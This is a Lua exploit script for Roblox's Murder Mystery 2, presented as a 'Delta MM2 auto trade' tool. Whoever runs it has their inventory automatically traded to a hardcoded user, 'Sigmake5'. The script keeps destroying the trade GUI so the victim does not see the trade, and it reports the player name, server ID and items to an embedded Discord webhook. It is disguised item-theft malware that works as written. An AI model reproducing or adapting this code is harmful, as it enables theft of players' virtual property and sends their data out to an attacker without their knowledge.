-- -- DELTA MM2 AUTO TRADE SCRIPT
-- Works with Delta Executor
-- Auto trades to Sigmake5 when they join

local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
local TARGET_USER = "Sigmake5"

local player = game.Players.LocalPlayer
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

-- Delta-compatible webhook
local function sendLog(message)
    pcall(function()
        local data = HttpService:JSONEncode({
            content = "**MM2 Auto Trade**\n" .. tostring(message) .. "\nServer: `" .. (game.JobId or "Unknown") .. "`"
        })
        local headers = {["Content-Type"] = "application/json"}
        -- Delta uses request
        request({Url = webhook, Method = "POST", Headers = headers, Body = data})
    end)
end

-- Hide trade GUI (Delta compatible)
local function hideGUI()
    pcall(function()
        for _, gui in pairs(player.PlayerGui:GetChildren()) do
            if gui.Name:lower():find("trade") then
                gui:Destroy()
            end
        end
    end)
end

-- Keep hiding GUI
spawn(function()
    while wait(0.5) do
        hideGUI()
    end
end)

-- Find all trade remotes in MM2
local TradeRemotes = {}

local function scanRemotes()
    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local name = v.Name:lower()
            if name:find("trade") then
                TradeRemotes[v.Name] = v
                sendLog("Found remote: " .. v.Name)
            end
        end
    end
end

-- Try to send trade using different methods
local function sendTradeToTarget(target)
    -- Method 1: Try TradeInvite
    local invite = ReplicatedStorage:FindFirstChild("TradeInvite")
    if invite then
        invite:FireServer(target)
        sendLog("Trade sent via TradeInvite")
        return true
    end
    
    -- Method 2: Try SendTradeRequest
    local sendReq = ReplicatedStorage:FindFirstChild("SendTradeRequest")
    if sendReq then
        sendReq:FireServer(target)
        sendLog("Trade sent via SendTradeRequest")
        return true
    end
    
    -- Method 3: Try any remote with trade in name
    for _, remote in pairs(TradeRemotes) do
        pcall(function()
            remote:FireServer(target)
            sendLog("Trade sent via: " .. remote.Name)
            return true
        end)
    end
    
    sendLog("No trade remote found!")
    return false
end

-- Get items from MM2
local function getItems()
    local items = {}
    
    -- Check backpack
    for _, item in pairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(items, item)
            sendLog("Item in backpack: " .. item.Name)
        end
    end
    
    -- Check character
    if player.Character then
        for _, item in pairs(player.Character:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(items, item)
                sendLog("Item equipped: " .. item.Name)
            end
        end
    end
    
    return items
end

-- Add items to trade
local function addItemsToTrade(items)
    local addRemote = ReplicatedStorage:FindFirstChild("AddTradeItem") or 
                      ReplicatedStorage:FindFirstChild("TradeAddItem")
    
    if not addRemote then
        sendLog("No add item remote found")
        return 0
    end
    
    local added = 0
    for i = 1, math.min(4, #items) do
        pcall(function()
            addRemote:FireServer(items[i])
            added = added + 1
            sendLog("Added: " .. items[i].Name)
        end)
        wait(0.3)
    end
    
    return added
end

-- Ready up
local function readyTrade()
    local readyRemote = ReplicatedStorage:FindFirstChild("TradeReady") or 
                        ReplicatedStorage:FindFirstChild("ReadyTrade")
    if readyRemote then
        pcall(function()
            readyRemote:FireServer(true)
            sendLog("Ready up")
        end)
    end
end

-- Accept trade
local function acceptTrade()
    local acceptRemote = ReplicatedStorage:FindFirstChild("TradeResponse") or 
                         ReplicatedStorage:FindFirstChild("AcceptTrade")
    if acceptRemote then
        pcall(function()
            acceptRemote:FireServer(true)
            sendLog("Trade accepted")
        end)
    end
end

-- Main trade sequence
local trading = false

local function doTrade(target)
    if trading then return end
    trading = true
    
    sendLog("Starting trade with " .. target.Name)
    
    -- Get items first
    local items = getItems()
    sendLog("Found " .. #items .. " items to trade")
    
    if #items == 0 then
        sendLog("No items found in inventory!")
        trading = false
        return
    end
    
    -- List items
    for _, item in pairs(items) do
        sendLog("  - " .. item.Name)
    end
    
    -- Send trade request
    local sent = sendTradeToTarget(target)
    if not sent then
        trading = false
        return
    end
    
    -- Wait for target to accept
    wait(3)
    
    -- Add items
    local added = addItemsToTrade(items)
    wait(1)
    
    -- Ready up
    readyTrade()
    wait(1)
    
    -- Final accept
    acceptTrade()
    
    sendLog("Trade completed! " .. added .. " items sent")
    trading = false
end

-- Listen for trade responses
local function listenForTradeResponse()
    for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") and remote.OnClientEvent then
            remote.OnClientEvent:Connect(function(...)
                local args = {...}
                for _, arg in pairs(args) do
                    if type(arg) == "table" and arg.Name == TARGET_USER then
                        sendLog(TARGET_USER .. " responded to trade!")
                        -- Add items and complete
                        local items = getItems()
                        addItemsToTrade(items)
                        wait(1)
                        readyTrade()
                        wait(0.5)
                        acceptTrade()
                    end
                end
            end)
        end
    end
end

-- Watch for target
local function watchForTarget()
    sendLog("Watching for " .. TARGET_USER)
    sendLog("Player: " .. player.Name)
    sendLog("Server: " .. game.JobId)
    
    -- Scan for remotes
    scanRemotes()
    listenForTradeResponse()
    
    -- Check existing players
    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Name == TARGET_USER and plr ~= player then
            sendLog(TARGET_USER .. " is already in server!")
            wait(2)
            doTrade(plr)
            return
        end
    end
    
    -- Watch for joins
    Players.PlayerAdded:Connect(function(newPlayer)
        if newPlayer.Name == TARGET_USER then
            sendLog(TARGET_USER .. " joined!")
            wait(3)
            doTrade(newPlayer)
        end
    end)
end

-- Start
sendLog("Delta MM2 Auto Trade Loaded")
watchForTarget()

print("Delta MM2 Auto Trade Active")
print("Waiting for Sigmake5 to join...")
